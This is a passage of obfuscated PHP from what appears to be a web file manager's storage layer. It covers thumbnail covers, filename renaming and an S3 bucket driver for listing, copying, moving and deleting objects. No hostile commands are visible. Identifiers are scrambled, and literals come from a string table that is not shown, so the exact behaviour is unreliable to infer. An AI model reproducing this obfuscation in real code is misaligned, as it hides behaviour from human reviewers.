$½¤±‘âÄ[$ÜßÙ»„ü[184]]; if ($¼Ù›ÆŸ && isset($¼Ù›ÆŸ[$ÜßÙ»„ü[185]])) { if ($¼Ù›ÆŸ[$ÜßÙ»„ü[185]] <= $øôá¸¨¸ && $¼Ù›ÆŸ[$ÜßÙ»„ü[186]] <= $øôá¸¨¸) { $Àı©œ¡Î = !0; } } } if ($½¤±‘âÄ[$ÜßÙ»„ü[79]] <= 1024 * 50 || $Àı©œ¡Î || !function_exists($ÜßÙ»„ü[187]) || $½¤±‘âÄ[$ÜßÙ»„ü[169]] == $ÜßÙ»„ü[188]) { return $this->fileOut($‹§ì¦²«, !1, $½¤±‘âÄ[$ÜßÙ»„ü[32]]); } $æŠçéÜö = kodIO::hashPath($½¤±‘âÄ); $Î†µ˜áÚ = "\x63\x6f\x76\145\x72\x5f{$æŠçéÜö}\x5f{$øôá¸¨¸}\x2e\x70\x6e\147"; $¬Ö¾©§ = IO_PATH_SYSTEM_TEMP . $ÜßÙ»„ü[189]; $üü›õÂ‡ = IO::infoFullSimple($¬Ö¾©§); $š…ãŠàÏ = $üü›õÂ‡ && is_array($üü›õÂ‡) ? $üü›õÂ‡[$ÜßÙ»„ü[87]] : $ÜßÙ»„ü[12]; if (!$š…ãŠàÏ) { $š…ãŠàÏ = IO::mkdir($¬Ö¾©§); } if ($½¤±‘âÄ[$ÜßÙ»„ü[190]] == $ÜßÙ»„ü[191] && isset($½¤±‘âÄ[$ÜßÙ»„ü[192]]) && $½¤±‘âÄ[$ÜßÙ»„ü[192]] == kodIO::sourceID($š…ãŠàÏ)) { $´ùÁÓ‡Ñ = $½¤±‘âÄ[$ÜßÙ»„ü[193]]; if ($øôá¸¨¸ <= 500) { $Òàù†Œ = preg_replace($ÜßÙ»„ü[194], $ÜßÙ»„ü[195], $½¤±‘âÄ[$ÜßÙ»„ü[32]]); $´ùÁÓ‡Ñ = IO::fileNameExist($š…ãŠàÏ, $Òàù†Œ); } return IO::fileOut(KodIO::make($´ùÁÓ‡Ñ), !1, $½¤±‘âÄ[$ÜßÙ»„ü[32]]); } $ö®Şœ¤˜ = IO::fileNameExist($š…ãŠàÏ, $Î†µ˜áÚ); if ($ö®Şœ¤˜) { return IO::fileOut(KodIO::make($ö®Şœ¤˜), !1, $½¤±‘âÄ[$ÜßÙ»„ü[32]]); } if ($øôá¸¨¸ > 1000) { $this->makeImageCover($š…ãŠàÏ, $‹§ì¦²«, $Î†µ˜áÚ, $øôá¸¨¸); $this->makeImageCover($š…ãŠàÏ, $‹§ì¦²«, "\x63\157\166\x65\162\137{$æŠçéÜö}\x5f\x32\x35\x30\56\x70\156\147", 250); $ö®Şœ¤˜ = IO::fileNameExist($š…ãŠàÏ, $Î†µ˜áÚ); if ($ö®Şœ¤˜) { return IO::fileOut(KodIO::make($ö®Şœ¤˜), !1, $½¤±‘âÄ[$ÜßÙ»„ü[32]]); } die; } $ôÜºÓº« = Cache::get($Î†µ˜áÚ); if ($ôÜºÓº« == $ÜßÙ»„ü[196] || $ôÜºÓº« == $ÜßÙ»„ü[197]) { echo $ôÜºÓº«; die; } Cache::set($Î†µ˜áÚ, $ÜßÙ»„ü[197], 60); $ıëŸœÓ = array($š…ãŠàÏ, $½¤±‘âÄ[$ÜßÙ»„ü[87]], $Î†µ˜áÚ, $øôá¸¨¸); $±œ¸ƒ¼æ = $ÜßÙ»„ü[198] . $½¤±‘âÄ[$ÜßÙ»„ü[79]] . $ÜßÙ»„ü[199] . $Î†µ˜áÚ . $ÜßÙ»„ü[200] . $½¤±‘âÄ[$ÜßÙ»„ü[32]] . $ÜßÙ»„ü[201] . $½¤±‘âÄ[$ÜßÙ»„ü[87]]; TaskQueue::add($ÜßÙ»„ü[202], $ıëŸœÓ, $±œ¸ƒ¼æ, $Î†µ˜áÚ); } public function makeImageCover($ö¨“Ò±„, $´ÅìäÇé, $ìÀÄ¦Äæ, $šÖôÈîæ) { $‹×Ìü¹Í =& $_SERVER[÷åé¼î]; if (IO::fileNameExist($ö¨“Ò±„, $ìÀÄ¦Äæ)) { return $‹×Ìü¹Í[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Ğ“¥İÓ‰ = DATA_THUMB . $ìÀÄ¦Äæ; del_file($Ğ“¥İÓ‰); $÷Òï = TEMP_FILES . $ìÀÄ¦Äæ; if (!@file_exists($÷Òï)) { $÷Òï = $this->download($´ÅìäÇé, $÷Òï); } if (!@file_exists($÷Òï)) { return $‹×Ìü¹Í[204]; } ImageThumb::createThumb($÷Òï, $Ğ“¥İÓ‰, $šÖôÈîæ, $šÖôÈîæ * 10); if (@file_exists($Ğ“¥İÓ‰)) { Cache::remove($ìÀÄ¦Äæ); return IO::move($Ğ“¥İÓ‰, $ö¨“Ò±„); } Cache::set($ìÀÄ¦Äæ, $‹×Ìü¹Í[196], 600); del_file($Ğ“¥İÓ‰); return $‹×Ìü¹Í[205] . $÷Òï . $‹×Ìü¹Í[74]; } public function fileOutImageServer($ÅÉ£©ƒ, $“ÇÜˆ‡­ = 250) { $this->fileOutImage($ÅÉ£©ƒ, $“ÇÜˆ‡­); } public function fileNameAuto($ÕßÂÑß, $€¥ó¤“, $õ‹¸ä = REPEAT_RENAME, $ÓÛÂâƒ = false) { $²°Ñ±Ã¶ =& $_SERVER[÷åé¼î]; $ÎÙæˆ = $ÕßÂÑß === $²°Ñ±Ã¶[12] ? $€¥ó¤“ : rtrim($ÕßÂÑß, $²°Ñ±Ã¶[8]) . $²°Ñ±Ã¶[8] . $€¥ó¤“; if ($õ‹¸ä == REPEAT_REPLACE || !$this->exist($ÎÙæˆ) || $ÓÛÂâƒ && $õ‹¸ä != REPEAT_RENAME_FOLDER) { return $€¥ó¤“; } if ($õ‹¸ä == REPEAT_SKIP) { return !1; } $†ÎÉ¬ØÛ = $²°Ñ±Ã¶[10] . get_path_ext($€¥ó¤“); $†ÎÉ¬ØÛ = $†ÎÉ¬ØÛ == $²°Ñ±Ã¶[10] || $ÓÛÂâƒ ? $²°Ñ±Ã¶[12] : $†ÎÉ¬ØÛ; $ôÅ‰‘Î = 1; $Ÿˆ½¥×  = substr($€¥ó¤“, 0, strlen($€¥ó¤“) - strlen($†ÎÉ¬ØÛ)); $âû¢ğÀÉ = $Ÿˆ½¥×  . "\x28{$ôÅ‰‘Î}\x29{$†ÎÉ¬ØÛ}"; while ($this->exist(rtrim($ÕßÂÑß, $²°Ñ±Ã¶[8]) . $²°Ñ±Ã¶[8] . $âû¢ğÀÉ)) { $âû¢ğÀÉ = $Ÿˆ½¥×  . "\50{$ôÅ‰‘Î}\x29{$†ÎÉ¬ØÛ}"; $ôÅ‰‘Î++; } return $âû¢ğÀÉ; } private function fileNameAutoList($¾³¶Ù¬, $–“¦˜í, $ÈŒ± = false) { $Ğ¡‡˜ü™ =& $_SERVER[÷åé¼î]; $—ˆûş™ = $this->listPath($¾³¶Ù¬, !0); $—ˆûş™ = array_merge($—ˆûş™[$Ğ¡‡˜ü™[85]], $—ˆûş™[$Ğ¡‡˜ü™[86]]); $ù†ó×‡ = array_to_keyvalue($—ˆûş™, $Ğ¡‡˜ü™[12], $Ğ¡‡˜ü™[32]); $â¯äÄËü = $Ğ¡‡˜ü™[10] . get_path_ext($–“¦˜í); $â¯äÄËü = $â¯äÄËü == $Ğ¡‡˜ü™[10] || $ÈŒ± ? $Ğ¡‡˜ü™[12] : $â¯äÄËü; $Í«âààÒ = substr($–“¦˜í, 0, strlen($–“¦˜í) - strlen($â¯äÄËü)); $ˆ§¤³§ = $Í«âààÒ . "\50\x30\51{$â¯äÄËü}"; for ($ŞŞËÂàß = 1; $ŞŞËÂàß <= count($ù†ó×‡) + 1; $ŞŞËÂàß++) { $ˆ§¤³§ = $Í«âààÒ . "\50{$ŞŞËÂàß}\51{$â¯äÄËü}"; if (!in_array_not_case($ˆ§¤³§, $ù†ó×‡)) { return $ˆ§¤³§; } } return $ˆ§¤³§; } public function listAllFiles($Á¿¢‚Â“, $ÚıçÖã) { $…î¡û£Ò =& $_SERVER[÷åé¼î]; if (empty($ÚıçÖã)) { return array(); } $ïßíÁ¿õ = array_keys($ÚıçÖã); $›ÔıÕ‡Õ = array(); $Á¿¢‚Â“ = trim($Á¿¢‚Â“, $…î¡û£Ò[8]); foreach ($ÚıçÖã as $›˜„»ü => $İÀÅìñ) { $ôü„Ø” = ltrim(substr(trim($›˜„»ü, $…î¡û£Ò[8]), strlen($Á¿¢‚Â“)), $…î¡û£Ò[8]); if (substr($›˜„»ü, -1) == $…î¡û£Ò[8]) { $ôü„Ø” = rtrim($ôü„Ø”, $…î¡û£Ò[8]) . $…î¡û£Ò[8]; } $›ÔıÕ‡Õ = array_merge($›ÔıÕ‡Õ, $this->slicePath($ôü„Ø”)); } $Ÿ—İéúÔ = array(); foreach (array_unique($›ÔıÕ‡Õ) as $ƒ‹÷¨¹Ş) { $íÏ‰»èÌ = array($…î¡û£Ò[87] => $this->getPathOuter($…î¡û£Ò[8] . $Á¿¢‚Â“ . $…î¡û£Ò[8] . $ƒ‹÷¨¹Ş), $…î¡û£Ò[78] => 1, $…î¡û£Ò[79] => 0); if (substr($ƒ‹÷¨¹Ş, -1) != $…î¡û£Ò[8]) { $íÏ‰»èÌ[$…î¡û£Ò[78]] = 0; $Ìõ¸Çå = $this->getPath($Á¿¢‚Â“ . $…î¡û£Ò[8] . $ƒ‹÷¨¹Ş); if (isset($ÚıçÖã[$Ìõ¸Çå])) { $Ó³²Ñ×  = $ÚıçÖã[$Ìõ¸Çå]; if (isset($Ó³²Ñ× [$…î¡û£Ò[79]])) { $íÏ‰»èÌ[$…î¡û£Ò[79]] = intval($Ó³²Ñ× [$…î¡û£Ò[79]]); } if (isset($Ó³²Ñ× [$…î¡û£Ò[206]])) { $íÏ‰»èÌ[$…î¡û£Ò[88]] = intval($Ó³²Ñ× [$…î¡û£Ò[206]]); } } } $Ÿ—İéúÔ[] = $íÏ‰»èÌ; } return $Ÿ—İéúÔ; } public function slicePath($åË’Ïª¶) { $™ù‹ı©° =& $_SERVER[÷åé¼î]; $ùëìÓ”ƒ = explode($™ù‹ı©°[8], trim($åË’Ïª¶, $™ù‹ı©°[8])); $¦ùÑõè = 0; do { ++$¦ùÑõè; $ã¾¯§±ï[] = implode($™ù‹ı©°[8], array_slice($ùëìÓ”ƒ, 0, $¦ùÑõè)) . $™ù‹ı©°[8]; } while ($¦ùÑõè < count($ùëìÓ”ƒ)); $ã¾¯§±ï[count($ùëìÓ”ƒ) - 1] = $åË’Ïª¶; return $ã¾¯§±ï; } public function getHost() { $‹‰¨½÷œ =& $_SERVER[÷åé¼î]; $úşÍ¹ÑÈ = parse_url(trim($this->domain, $‹‰¨½÷œ[8])); $€ÓÀ³Œ˜ = isset($úşÍ¹ÑÈ[$‹‰¨½÷œ[207]]) ? $úşÍ¹ÑÈ[$‹‰¨½÷œ[207]] : http_type(); $ø¿•ª‡ = isset($úşÍ¹ÑÈ[$‹‰¨½÷œ[208]]) ? $úşÍ¹ÑÈ[$‹‰¨½÷œ[208]] : $úşÍ¹ÑÈ[$‹‰¨½÷œ[87]]; if (isset($úşÍ¹ÑÈ[$‹‰¨½÷œ[209]])) { $ø¿•ª‡ .= $‹‰¨½÷œ[4] . $úşÍ¹ÑÈ[$‹‰¨½÷œ[209]]; } return $€ÓÀ³Œ˜ . $‹‰¨½÷œ[210] . $ø¿•ª‡; } public function pathEncode($¢èÜÔæ£) { $ŸÀÒĞê =& $_SERVER[÷åé¼î]; return str_replace($ŸÀÒĞê[211], $ŸÀÒĞê[8], rawurlencode($¢èÜÔæ£)); } public function writeLog($Æè†÷¸Ø = '', $†òû±É = false) { $Şİ¥ù†Ë =& $_SERVER[÷åé¼î]; $Ü¹›Ì­‘ = in_array(ACTION, array($Şİ¥ù†Ë[212], $Şİ¥ù†Ë[213])); if (!$Ü¹›Ì­‘ && !GLOBAL_DEBUG) { return; } $´İÀÓ = $Æè†÷¸Ø; static $”Ûì„Ô = null; if (!$”Ûì„Ô) { $”Ûì„Ô = strtoupper($this->getType()); } $Æè†÷¸Ø = $”Ûì„Ô . $Şİ¥ù†Ë[214] . $Æè†÷¸Ø; if ($†òû±É) { $İĞºË°ü = error_get_last(); if ($İĞºË°ü) { $Æè†÷¸Ø = array($Æè†÷¸Ø, $İĞºË°ü); } } write_log($Æè†÷¸Ø, $Şİ¥ù†Ë[215]); if ($Ü¹›Ì­‘) { throw new Exception($´İÀÓ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($íò©áï‰) { set_timeout(); require_once SDK_DIR . $_SERVER[÷åé¼î][216]; parent::__construct(); $this->_init($íò©áï‰); } public function _init($Ö¬ô‰¸) { $ùÑÆŸ =& $_SERVER[÷åé¼î]; $this->config = $Ö¬ô‰¸; foreach ($Ö¬ô‰¸ as $é Šæ©© => $ñî˜ß¬¼) { if (isset($this->{$é Šæ©©})) { $this->{$é Šæ©©} = $ñî˜ß¬¼; } } $this->endpoint = $Ö¬ô‰¸[$ùÑÆŸ[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($ùÑÆŸ[212], $ùÑÆŸ[213]))) { $this->client->setExceptions(); } } public function setSignVersion($şÔÚ°î× = "\x76\x34") { $this->signVer = $şÔÚ°î×; $this->client->setSignatureVersion($şÔÚ°î×); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $›æ›Óäî) { return null; } } public function isBucketCors() { $Ê…±¸ì— =& $_SERVER[÷åé¼î]; $Ê·ª¹Øó = $this->getBucketCors(); if (!$Ê·ª¹Øó || !is_array($Ê·ª¹Øó)) { return !1; } if (!is_array($Ê·ª¹Øó[$Ê…±¸ì—[218]])) { $Ê·ª¹Øó[$Ê…±¸ì—[218]] = explode($Ê…±¸ì—[50], $Ê·ª¹Øó[$Ê…±¸ì—[218]]); } if ($Ê·ª¹Øó[$Ê…±¸ì—[219]] != $Ê…±¸ì—[220] || !in_array($Ê…±¸ì—[220], $Ê·ª¹Øó[$Ê…±¸ì—[218]])) { return !1; } $ø£’áÏË = array_map($Ê…±¸ì—[221], $Ê·ª¹Øó[$Ê…±¸ì—[222]]); if (!is_array($ø£’áÏË)) { $ø£’áÏË = array(); } $ßÌú„ºã = array($Ê…±¸ì—[223], $Ê…±¸ì—[224], $Ê…±¸ì—[225], $Ê…±¸ì—[226], $Ê…±¸ì—[227]); $ †µ±° = array_diff($ßÌú„ºã, $ø£’áÏË); return empty($ †µ±°); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($¥ÚÜĞºÓ, $ÖëıÉœ = '', $ÁíÚüÚ‘ = REPEAT_RENAME) { $²­îÚ = $this->setContent($¥ÚÜĞºÓ, $ÖëıÉœ); if ($²­îÚ !== !1) { return $this->getPathOuter($¥ÚÜĞºÓ); } return !1; } public function mkdir($ûÕó‡šó, $¹ïÀ£ƒˆ = REPEAT_SKIP) { $™ä…‰–ş =& $_SERVER[÷åé¼î]; if (empty($ûÕó‡šó) && $ûÕó‡šó !== $™ä…‰–ş[228]) { return !1; } if ($¹ïÀ£ƒˆ && $this->_isFolder($ûÕó‡šó)) { return $this->getPathOuter($ûÕó‡šó); } $³°¤à²¡ = $this->setContent($ûÕó‡šó, $™ä…‰–ş[12], !0); if ($³°¤à²¡ !== !1) { return $this->getPathOuter($ûÕó‡šó); } return !1; } public function copyFile($ŠÉÃà¢², $§ã³ä¯, $úµ¡½—€ = array()) { $êøáŒŸ =& $_SERVER[÷åé¼î]; $ÚÈşÄ¯ = $this->objectMeta($ŠÉÃà¢²); if (!$ÚÈşÄ¯) { return !1; } if ($ÚÈşÄ¯[$êøáŒŸ[79]] <= 1024 * 1024 * 200) { $Ğ ùáÌ€ = $this->client->copyObject($this->bucket, $ŠÉÃà¢², $this->bucket, $§ã³ä¯, $êøáŒŸ[229], $úµ¡½—€); } else { $Ğ ùáÌ€ = $this->client->multiCopyObject($this->bucket, $ŠÉÃà¢², $this->bucket, $§ã³ä¯, $úµ¡½—€); } $Ğ ùáÌ€ = $Ğ ùáÌ€ ? $this->getPathOuter($§ã³ä¯) : !1; return $Ğ ùáÌ€; } public function moveFile($Š¹™†ñì, $œü‘ÅÑĞ) { if ($this->copyFile($Š¹™†ñì, $œü‘ÅÑĞ)) { $this->delFile($Š¹™†ñì); return $this->getPathOuter($œü‘ÅÑĞ); } return !1; } public function delFile($¶­ƒÍ³Ú) { return $this->client->deleteObject($this->bucket, $¶­ƒÍ³Ú); } public function delFolder($«”‚˜óÅ) { $­ïç—äµ =& $_SERVER[÷åé¼î]; if (!$this->exist($«”‚˜óÅ)) { return !0; } $this->listItemCache = !1; $Ã˜ÆÜæ­ = $this->fileList($«”‚˜óÅ); $this->listItemCache = !0; $­ƒğáş = trim($«”‚˜óÅ, $­ïç—äµ[8]) . $­ïç—äµ[8]; if (!empty($«”‚˜óÅ) && $«”‚˜óÅ !== $­ïç—äµ[228] && !in_array($­ƒğáş, $Ã˜ÆÜæ­[$­ïç—äµ[85]])) { $Ã˜ÆÜæ­[$­ïç—äµ[85]][] = $­ƒğáş; } $¨‡şĞİŸ = $this->delByBatch($Ã˜ÆÜæ­[$­ïç—äµ[86]]); if (!$¨‡şĞİŸ) { return !1; } $¨‡şĞİŸ = $this->delByBatch($Ã˜ÆÜæ­[$­ïç—äµ[85]]); if (!$¨‡şĞİŸ) { return !1; } return $this->delFile($­ƒğáş); } private function delByBatch($²¬Ê²Ñõ) { foreach (array_chunk($²¬Ê²Ñõ, 1000) as $»‘¨©ïİ) { $ãÑ¦©•Û = $this->client->deleteObjects($this->bucket, $»‘¨©ïİ); if (!$ãÑ¦©•Û) { return !1; } } return !0; } public function rename($åôö¸çŞ, $¶ø³º£) { return $this->renameObject($åôö¸çŞ, $¶ø³º£); } public function listPath($¡³´’£Î, $İŠ¶©ôØ = false) { $Ö‹Ãü” =& $_SERVER[÷åé¼î]; $ÑÉæåÌ = $this->fileList($¡³´’£Î, $Ö‹Ãü”[8], !0); foreach ($ÑÉæåÌ[$Ö‹Ãü”[85]] as $¥ßû…¬ => $ûì¦èÒ³) { $ÑÉæåÌ[$Ö‹Ãü”[85]][$¥ßû…¬] = $this->folderInfo($ûì¦èÒ³, $İŠ¶©ôØ, $ûì¦èÒ³); } foreach ($ÑÉæåÌ[$Ö‹Ãü”[86]] as $¥ßû…¬ => $ûì¦èÒ³) { $ÑÉæåÌ[$Ö‹Ãü”[86]][$¥ßû…¬] = $this->fileInfo($ûì¦èÒ³[$Ö‹Ãü”[32]], $İŠ¶©ôØ, $ûì¦èÒ³); } return $ÑÉæåÌ; } protected function infoChildren($õôÏ·Éƒ, &$µ±Â³á†) { $ĞÆã¹¥— =& $_SERVER[÷åé¼î]; $£¹¹éÀæ = $this->fileList($õôÏ·Éƒ, $ĞÆã¹¥—[12], !0); $µ±Â³á†[$ĞÆã¹¥—[81]] += count($£¹¹éÀæ[$ĞÆã¹¥—[85]]); $µ±Â³á†[$ĞÆã¹¥—[80]] += count($£¹¹éÀæ[$ĞÆã¹¥—[86]]); foreach ($£¹¹éÀæ[$ĞÆã¹¥—[86]] as $Ñå¿»èÒ) { if (!$Ñå¿»èÒ || !$Ñå¿»èÒ[$ĞÆã¹¥—[79]]) { continue; } $µ±Â³á†[$ĞÆã¹¥—[79]] += $Ñå¿»èÒ[$ĞÆã¹¥—[79]]; } } private function fileInfo($¶ÉÓ„¾‚, $Î®£’ø = false, $ÇÒÖÂçô = array()) { $ÈÂ€âå =& $_SERVER[÷åé¼î]; $¹©İõ¦Ğ = array($ÈÂ€âå[32] => $this->pathThis($¶ÉÓ„¾‚), $ÈÂ€âå[87] => $this->getPathOuter($¶ÉÓ„¾‚), $ÈÂ€âå[33] => $ÈÂ€âå[230], $ÈÂ€âå[169] => $this->ext($¶ÉÓ„¾‚), $ÈÂ€âå[79] => isset($ÇÒÖÂçô[$ÈÂ€âå[79]]) ? $ÇÒÖÂçô[$ÈÂ€âå[79]] : 0); if ($Î®£’ø) { return $¹©İõ¦Ğ; } $¹©İõ¦Ğ[$ÈÂ€âå[231]] = $¹©İõ¦Ğ[$ÈÂ€âå[88]] = 0; $¹©İõ¦Ğ[$ÈÂ€âå[232]] = $¹©İõ¦Ğ[$ÈÂ€âå[233]] = !0; if (empty($ÇÒÖÂçô)) { $ÇÒÖÂçô = $this->objectMeta($¶ÉÓ„¾‚); if (!$ÇÒÖÂçô) { return $¹©İõ¦Ğ; } } if (isset($ÇÒÖÂçô[$ÈÂ€âå[234]]) && $ÇÒÖÂçô[$ÈÂ€âå[234]]) { $¹©İõ¦Ğ[$ÈÂ€âå[235]] = $ÇÒÖÂçô[$ÈÂ€âå[234]]; } if (isset($ÇÒÖÂçô[$ÈÂ€âå[206]])) { $¹©İõ¦Ğ[$ÈÂ€âå[88]] = $ÇÒÖÂçô[$ÈÂ€âå[206]]; } if (isset($ÇÒÖÂçô[$ÈÂ€âå[79]])) { $¹©İõ¦Ğ[$ÈÂ€âå[79]] = $ÇÒÖÂçô[$ÈÂ€âå[79]]; } return $¹©İõ¦Ğ; } private function folderInfo($“ –Û§Ä, $Ñ¼¸»îš = false, $òœû©Ô = array()) { $ÜŞÕº¾´ =& $_SERVER[÷åé¼î]; $ĞòÛÄƒâ = array($ÜŞÕº¾´[32] => $this->pathThis($“ –Û§Ä), $ÜŞÕº¾´[87] => $this->getPathOuter($ÜŞÕº¾´[8] . $“ –Û§Ä), $ÜŞÕº¾´[33] => $ÜŞÕº¾´[78]); if ($Ñ¼¸»îš) { return $ĞòÛÄƒâ; } $ĞòÛÄƒâ[$ÜŞÕº¾´[231]] = $ĞòÛÄƒâ[$ÜŞÕº¾´[88]] = 0; $ĞòÛÄƒâ[$ÜŞÕº¾´[232]] = $ĞòÛÄƒâ[$ÜŞÕº¾´[233]] = !0; if ($“ –Û§Ä == $ÜŞÕº¾´[12]) { return $ĞòÛÄƒâ; } if (empty($òœû©Ô)) { $òœû©Ô = $this->objectMeta(trim($“ –Û§Ä, $ÜŞÕº¾´[8]) . $ÜŞÕº¾´[8]); } if (isset($òœû©Ô[$ÜŞÕº¾´[206]])) { $ĞòÛÄƒâ[$ÜŞÕº¾´[231]] = $òœû©Ô[$ÜŞÕº¾´[206]]; } return $ĞòÛÄƒâ; } private function fileList($ÚöÄ°Îñ, $‚è»Í™± = '', $Õş™‹” = 0) { $Ã¿º½È =& $_SERVER[÷åé¼î]; $ş‹ÖÅ”Š = rtrim($ÚöÄ°Îñ, $Ã¿º½È[8]) . $Ã¿º½È[8]; $›’²Ë×À = $this->listObjs($ş‹ÖÅ”Š, null, null, $‚è»Í™±); if (!$›’²Ë×À) { return array($Ã¿º½È[85] => array(), $Ã¿º½È[86] => array()); } $»’Ô´Ë³ = $ÙÄª°ë÷ = array(); foreach ($›’²Ë×À[$Ã¿º½È[236]] as $ßØš·Ûš) { $­œÅ‹ñ = $ßØš·Ûš[$Ã¿º½È[32]]; if ($­œÅ‹ñ == $ş‹ÖÅ”Š) { continue; } $€Ôô›ó = isset($ßØš·Ûš[$Ã¿º½È[79]]) ? $ßØš·Ûš[$Ã¿º½È[79]] : 0; $·„‚“§é = $€Ôô›ó == 0 && substr($­œÅ‹ñ, strlen($­œÅ‹ñ) - 1, 1) == $Ã¿º½È[8] ? !0 : !1; $this->cacheMethodInfoSet($­œÅ‹ñ, $·„‚“§é, $ßØš·Ûš); if ($·„‚“§é) { $»’Ô´Ë³[] = $­œÅ‹ñ; continue; } $ÙÄª°ë÷[] = $Õş™‹” ? $ßØš·Ûš : $­œÅ‹ñ; } foreach ($›’²Ë×À[$Ã¿º½È[237]] as $ßØš·Ûš) { $»’Ô´Ë³[] = $ßØš·Ûš[$Ã¿º½È[32]]; $this->cacheMethodInfoSet($ßØš·Ûš[$Ã¿º½È[32]], !0); } $this->cacheMethodInfoSet($ÚöÄ°Îñ, !0); return array($Ã¿º½È[85] => $»’Ô´Ë³, $Ã¿º½È[86] => $ÙÄª°ë÷); } private function listObjs($çÙÅå¼ı, $®§º‚ = null, $ßÆÚÚ¬å = null, $­šƒÑ™‡ = null) { $­Š‰³® =& $_SERVER[÷åé¼î]; $çÙÅå¼ı = trim($çÙÅå¼ı, $­Š‰³®[8]); $àşüÈ˜Ã = empty($çÙÅå¼ı) && $çÙÅå¼ı !== $­Š‰³®[228] ? $­Š‰³®[12] : $çÙÅå¼ı . $­Š‰³®[8]; return $this->client->getBucket($this->bucket, $àşüÈ˜Ã, $®§º‚, $ßÆÚÚ¬å, $­šƒÑ™‡, !0); } public function has($æï¬«‚æ, $Ø“­¡È— = false, $“ïŸ³Ï° = true) { $ÙôÓá¾Ê =& $_SERVER[÷åé¼î]; $æï¬«‚æ = trim($æï¬«‚æ, $ÙôÓá¾Ê[8]); $—¶ˆ¿ıÏ = empty($æï¬«‚æ) && $æï¬«‚æ !== $ÙôÓá¾Ê[228] ? $ÙôÓá¾Ê[12] : $æï¬«‚æ . $ÙôÓá¾Ê[8]; $çÀ€²Ê× = null; $Î“¹ÎÈ = 500; $™¢™ğ»Ò = $ÙôÓá¾Ê[8]; $¿«â³Ë = $Òï‘ × = array(); while (!0) { $Üæ¢—Š° = $this->listObjs($æï¬«‚æ, $çÀ€²Ê×, $Î“¹ÎÈ, $™¢™ğ»Ò); if (!$Üæ¢—Š°) { break; } $çÀ€²Ê× = $Üæ¢—Š°[$ÙôÓá¾Ê[238]]; $¸ğ ŞÀÈ = $Üæ¢—Š°[$ÙôÓá¾Ê[236]]; $†‘ŸÉ‘— = $Üæ¢—Š°[$ÙôÓá¾Ê[237]]; if (empty($¸ğ ŞÀÈ) && empty($†‘ŸÉ‘—)) { break; } if (count($¸ğ ŞÀÈ) == 1 && $¸ğ ŞÀÈ[0][$ÙôÓá¾Ê[32]] == $—¶ˆ¿ıÏ) { break; } if ($Ø“­¡È—) { if (count($¸ğ ŞÀÈ)) { $¸ğ ŞÀÈ = array_column($¸ğ ŞÀÈ, $ÙôÓá¾Ê[32]); $¿«â³Ë = array_merge($¿«â³Ë, $¸ğ ŞÀÈ); } if (count($†‘ŸÉ‘—)) { $†‘ŸÉ‘— = array_column($†‘ŸÉ‘—, $ÙôÓá¾Ê[32]); $Òï‘ × = array_merge($Òï‘ ×, $†‘ŸÉ‘—); } if ($çÀ€²Ê× === null) { break; } continue; } if ($“ïŸ³Ï°) { if (!empty($¸ğ ŞÀÈ)) { if (count($¸ğ ŞÀÈ) > 1 || isset($¸ğ ŞÀÈ[0][$ÙôÓá¾Ê[32]]) && $¸ğ ŞÀÈ[0][$ÙôÓá¾Ê[32]] != $—¶ˆ¿ıÏ) { return !0; } } } else { if (!empty($†‘ŸÉ‘—)) { return !0; } } if ($çÀ€²Ê× === null) { break; } } if ($Ø“­¡È—) { $¿«â³Ë = array_diff($¿«â³Ë, array($—¶ˆ¿ıÏ)); $¿«â³Ë = count(array_unique($¿«â³Ë)); $Òï‘ × = count(array_unique($Òï‘ ×)); return array($ÙôÓá¾Ê[239] => $¿«â³Ë, $ÙôÓá¾Ê[240] => $Òï‘ ×); } return !1; } public function listAll($¯µæ®Òù) { $·¨Î ˜… =& $_SERVER[÷åé¼î]; $“ãİ¹™ = $this->fileList($¯µæ®Òù, $·¨Î ˜…[12], !0); $íßƒäÓà = array_to_keyvalue($“ãİ¹™[$·¨Î ˜…[86]], $·¨Î ˜…[32]); foreach ($“ãİ¹™[$·¨Î ˜…[85]] as $¯ŞçûìÀ) { if (is_string($¯ŞçûìÀ)) { $íßƒäÓà[$¯ŞçûìÀ] = array($·¨Î ˜…[79] => 0); } } return $this->listAllFiles($¯µæ®Òù, $íßƒäÓà); } public function canRead($Ÿ–µÀÒ) { $Ê—ÓŸ¸‡ =& $_SERVER[÷åé¼î]; $¯ø¼œ•À = $this->client->getAccessControlPolicy($this->bucket, $Ÿ–µÀÒ); if (!$¯ø¼œ•À) { return !1; } return in_array($¯ø¼œ•À, array($Ê—ÓŸ¸‡[241], $Ê—ÓŸ¸‡[242], $Ê—ÓŸ¸‡[243])) ? !0 : !1; } public function canWrite($î¹öÖ‚) { $šğŠÙ™› =& $_SERVER[÷åé¼î]; $½»×ò™ë = $this->client->getAccessControlPolicy($this->bucket, $î¹öÖ‚); if (!$½»×ò™ë) { return !1; } return in_array($½»×ò™ë, array($šğŠÙ™›[241], $šğŠÙ™›[242])) ? !0 : !1; } public function getContent($Ö¤ËÎ—Ò) { return $this->client->getObject($this->bucket, $Ö¤ËÎ—Ò); } public function setContent($ÈßÊéî€, $”’šçá¼ = '', $ìùäî–— = false) { $›…¦§›Ñ =& $_SERVER[÷åé¼î]; $ÈßÊéî€ = $ìùäî–— ? trim($ÈßÊéî€, $›…¦§›Ñ[8]) . $›…¦§›Ñ[8] : $ÈßÊéî€; $ˆöÌÉ½ = get_file_mime(get_path_ext($ÈßÊéî€)); $Â²Ãæ· = $this->client->putObject($”’šçá¼, $this->bucket, $ÈßÊéî€, $›…¦§›Ñ[229], array(), $ˆöÌÉ½); if (!$Â²Ãæ·) { return !1; } if ($ìùäî–—) { return !0; } return $Â²Ãæ· ? !0 : !1; } public function fileSubstr($ãÀ‚·ıø, $íüò™öÉ, $â¯èøÑè) { $¤ÃÇ»¦‡ = $íüò™öÉ + $â¯èøÑè - 1; return 